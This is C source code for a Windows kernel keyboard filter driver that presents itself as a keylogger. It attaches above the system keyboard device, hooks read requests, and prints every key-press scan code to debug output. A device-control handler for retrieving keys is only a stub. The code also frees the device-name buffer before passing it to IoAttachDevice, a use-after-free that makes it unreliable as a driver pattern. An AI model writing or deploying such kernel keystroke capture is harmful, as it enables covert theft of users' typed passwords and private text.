#include <initguid.h>
#include <wdm.h>
#include <ntddkbd.h>

#include "deviceExtension.h"
#include "info.h"
#include "ioCtls.h"

#pragma warning(disable: 5045) //Disable Spectre

VOID
UnloadRoutine(
	PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pDeviceExtension = pDriverObject->DeviceObject->DeviceExtension;

	IoDetachDevice(pDeviceExtension->pTargetDeviceObject);
	IoDeleteDevice(pDriverObject->DeviceObject);
}

NTSTATUS
IrpForwarding(
	PDEVICE_OBJECT pDeviceObject,
	PIRP pIrp)
{
	IoSkipCurrentIrpStackLocation(pIrp);

	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
	return IoCallDriver(pDeviceExtension->pTargetDeviceObject, pIrp);
}

NTSTATUS
HookCompletionRoutine(
	PDEVICE_OBJECT pDeviceObject,
	PIRP pIrp,
	PVOID pContext)
{
	UNREFERENCED_PARAMETER(pContext);
	ObfDereferenceObject(pDeviceObject);

	if (NT_SUCCESS(pIrp->IoStatus.Status))
	{
		PKEYBOARD_INPUT_DATA keyInfo = pIrp->AssociatedIrp.SystemBuffer;

		if (!keyInfo->Flags)
			DbgPrint("KeyLogger: %hu", keyInfo->MakeCode);
	}

	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	return pIrp->IoStatus.Status;
}



NTSTATUS
HookRoutine(
	PDEVICE_OBJECT pDeviceObject,
	PIRP pIrp)
{
	IoCopyCurrentIrpStackLocationToNext(pIrp);

	NTSTATUS returnedStatus = IoSetCompletionRoutineEx(
		pDeviceObject, pIrp,
		HookCompletionRoutine,
		NULL, TRUE, TRUE, TRUE);

	if (!NT_SUCCESS(returnedStatus))
		IoSkipCurrentIrpStackLocation(pIrp);
	else
		ObfReferenceObject(pDeviceObject);

	PDEVICE_EXTENSION pDeviceExtencion = pDeviceObject->DeviceExtension;
	return IoCallDriver(pDeviceExtencion->pTargetDeviceObject, pIrp);
}

NTSTATUS
CompleteIrp(
	PIRP pIrp,
	NTSTATUS ntStatus,
	ULONG info)
{
	pIrp->IoStatus.Status = ntStatus;
	pIrp->IoStatus.Information = info;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return ntStatus;
}

NTSTATUS
DeviceControlRoutine(
	PDEVICE_OBJECT pDeviceObject,
	PIRP pIrp)
{
	UNREFERENCED_PARAMETER(pDeviceObject);

	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	ULONG controlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	NTSTATUS exitCode = STATUS_SUCCESS;
	ULONG bytesSnd = 0;

	switch (controlCode)
	{
		case GET_KEY:
		{
			break;
		}

		default:
			exitCode = STATUS_INVALID_PARAMETER;
	}

	return CompleteIrp(pIrp, exitCode, bytesSnd);
}

NTSTATUS
DriverEntry(
	PDRIVER_OBJECT pDriverObject,
	PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pRegistryPath);

	for (INT i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; ++i)
		pDriverObject->MajorFunction[i] = IrpForwarding;

	pDriverObject->MajorFunction[IRP_MJ_READ] = HookRoutine;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlRoutine;
	pDriverObject->DriverUnload = UnloadRoutine;

	NTSTATUS returnedStatus;
	PDEVICE_OBJECT pDeviceObject;

	returnedStatus = IoCreateDevice(
		pDriverObject,
		sizeof(DEVICE_EXTENSION),
		NULL, FILE_DEVICE_KEYBOARD,
		0, FALSE,
		&pDeviceObject);
	
	if (!NT_SUCCESS(returnedStatus))
		return returnedStatus;

	pDeviceObject->Flags = DO_BUFFERED_IO;

	PZZWSTR symLinks;
	returnedStatus = IoGetDeviceInterfaces(
		&GUID_CLASS_KEYBOARD,
		NULL, 0, &symLinks);

	if (!NT_SUCCESS(returnedStatus))
	{
		IoDeleteDevice(pDeviceObject);
		return returnedStatus;
	}

	UNICODE_STRING targetDeviceName;
	RtlInitUnicodeString(&targetDeviceName, symLinks);

	ExFreePool(symLinks);
	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;

	returnedStatus = IoAttachDevice(
		pDeviceObject,
		&targetDeviceName,
		&pDeviceExtension->pTargetDeviceObject);

	if (!NT_SUCCESS(returnedStatus))
	{
		IoDeleteDevice(pDeviceObject);
		return returnedStatus;
	}

	return returnedStatus;
}